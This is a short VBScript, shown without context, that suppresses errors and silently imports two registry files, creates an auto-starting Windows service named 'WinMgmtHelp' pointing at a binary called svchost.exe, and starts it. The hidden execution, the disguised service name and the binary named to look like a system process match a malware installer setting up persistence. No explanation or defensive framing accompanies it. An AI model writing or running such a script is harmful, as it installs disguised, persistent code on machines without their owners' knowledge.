   On Error Resume Next
   set wshshell=createobject ("wscript.shell")
   a=wshshell.run ("reg.exe import 2kreg.reg",0)
   b=wshshell.run ("sc.exe create WinMgmtHelp binpath= c:\winnt\svchost.exe start= auto",0)
   c=wshshell.run ("reg.exe import 2ksrv.reg",0)
   d=wshshell.run ("net start WinMgmtHelp",0)
